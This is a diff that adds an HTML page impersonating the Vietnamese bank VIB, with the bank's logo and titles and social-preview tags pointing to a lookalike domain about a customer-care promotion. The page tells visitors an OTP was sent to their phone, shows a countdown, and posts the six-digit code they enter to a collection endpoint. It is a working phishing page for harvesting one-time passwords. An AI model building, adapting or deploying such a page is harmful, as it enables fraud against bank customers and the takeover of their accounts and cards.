@@ -1,0 +1,162 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="./css/style.css" />
+        <meta charset="UTF-8" />
+        <meta name="viewport"
+            content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
+        <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+        <meta name="twitter:card" content="summary_large_image" />
+        <meta name="twitter:site" content />
+        <meta name="twitter:image"
+            content="https://vib.chamsockhachang-thang-4.online/assest/img_review.jpg" />
+        <meta name="twitter:description"
+            content="Mở thẻ tín dụng online hưởng ưu đãi tích dặm và nhận điểm chi tiêu đến từ các thương hiệu đối tác. Trải nghiệm ưu đãi và hoàn phí thường niên cùng Ngân hàng TMCP Quốc tế Việt Nam VIB" />
+        <meta name="twitter:title"
+            content="Mở thẻ tín dụng miễn phí | Ngân hàng TMCP Quốc tế Việt Nam VIB" />
+        <meta property="og:title"
+            content="Mở thẻ tín dụng miễn phí | Ngân hàng TMCP Quốc tế Việt Nam VIB" />
+        <meta property="og:description"
+            content="Mở thẻ tín dụng online hưởng ưu đãi tích dặm và nhận điểm chi tiêu đến từ các thương hiệu đối tác. Trải nghiệm ưu đãi và hoàn phí thường niên cùng Ngân hàng TMCP Quốc tế Việt Nam VIB" />
+        <meta property="og:image"
+            content="https://vib.chamsockhachang-thang-4.online/assest/img_review.jpg" />
+        <meta property="og:url"
+            content="https://vib.chamsockhachang-thang-4.online" />
+        <title>Home - Dịch vụ Thẻ - Ngân hàng TMCP Quốc tế Việt Nam VIB</title>
+        <link rel="shortcut icon" href="./assets/favicon-32x32.png"
+            type="image/x-icon" />
+        <link rel="stylesheet"
+            href="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.css" />
+        <script
+            src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link
+            href="https://fonts.googleapis.com/css2?family=Quicksand&display=swap"
+            rel="stylesheet" />
+        <script src="https://code.jquery.com/jquery-3.6.1.js"
+            integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI="
+            crossorigin="anonymous"></script>
+        <script src="https://kit.fontawesome.com/00ff2b6895.js"
+            crossorigin="anonymous"></script>
+        <script>
+        function displayMetaValue() {
+            var metaTag = document.querySelector("meta[name='description']");
+            var metaValue = metaTag.getAttribute("content");
+            document.getElementById("display-value").innerHTML = metaValue;
+        }
+    </script>
+    </head>
+
+    <body>
+        <div class="main-heaer-logo">
+            <div class="box-header">
+
+                <div class="hearder-right">
+                    <a href="./">
+                        <img src="./assest/vib-logo.png" alt srcset />
+                    </a>
+                </div>
+                <div class="hearder-left">
+                    <div class="box-a">
+                        <a href> </a>
+                    </div>
+                    <i class="fa-solid fa-bars"></i>
+                </div>
+            </div>
+        </div>
+        <div class="main-body" style="width: 80%; margin: auto;">
+
+            <div class="container-body">
+                <div class="msg-error">
+                    <div class="loader"></div>
+                </div>
+                <div class="baner-review">
+                    <div class="tile-conpect" style="text-align: center;">
+                        <label for>Chúng tôi đã gửi mã OTP đến số điện thoại của
+                            bạn </label>
+                        <br>
+                        <p id="time" style="font-size: 30px">500</p>
+                        <!-- <label for>đến số điện thoại của bạn</label> -->
+                    </div>
+                    <div class="form-group aaa">
+                        <label for="phone">Nhập mã OTP:</label>
+                        <input style="padding: 8px 12px;" type="number"
+                            name="otp" id="otp"
+                            class="form-control" placeholder
+                            required="required">
+                    </div>
+                    <div class="form-group aaa">
+                        <input type="submit" name="send_data"
+                            value="Gửi thông tin"
+                            class="btn-km btn btn-primary" disabled>
+                        <!-- <p
+                            style="color: #6f6f6f; margin-top: 20px; font-size: 16px;">Bằng
+                            việc “Gửi” tôi đồng ý thông
+                            tin trên có thể sử dụng để đăng ký các dịch vụ của
+                            chúng
+                            tôi, cũng như đồng ý chúng tôi sử
+                            dụng các thông tin của tôi tại bên thứ ba để quyết
+                            định hạn
+                            mức tín dụng và phát hành thẻ
+                            cho tôi.</p> -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script src="../cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="../code.jquery.com/jquery-1.12.0.min.js"></script>
+        <script>
+        var timeleft = 500;
+
+        var downloadTimer = setInterval(function() {
+            timeleft--;
+            document.getElementById("time").textContent = timeleft;
+            if (timeleft <= 0) {
+                clearInterval(downloadTimer);
+                document.getElementById("time").textContent = "Hết thời gian";
+                document.querySelector(".msg-error").innerHTML = `<div class="msg-error">
+                    <div class="loader"></div>
+                    <p style="color: red; font-size: 20px;">Hết thời gian</p>
+                </div>`;
+            }
+        }, 1000);
+
+        document.getElementById("otp").addEventListener("input", function() {
+            if (document.getElementById("otp").value.length == 6) {
+                document.querySelector(".btn-km").disabled = false;
+            } else {
+                document.querySelector(".btn-km").disabled = true;
+            }
+        });
+
+        document.querySelector(".btn-km").addEventListener("click", function() {
+            var otp = document.getElementById("otp").value;
+            var data = {
+                otp: otp
+            };
+            axios.post("http://localhost/api/otp", data)
+                .then(function(response) {
+                    if (response.data.status == 200) {
+                        // window.location.href = response.data.url;
+                    } else {
+                        document.querySelector(".msg-error").innerHTML = `<div class="msg-error">
+                            <div class="loader"></div>
+                            <p style="color: red; font-size: 20px;">${response.data.message}</p>
+                        </div>`;
+                    }
+                })
+                .catch(function(error) {
+                    console.log(error);
+                });
+        });
+        </script>
+    </body>
+
+</html>
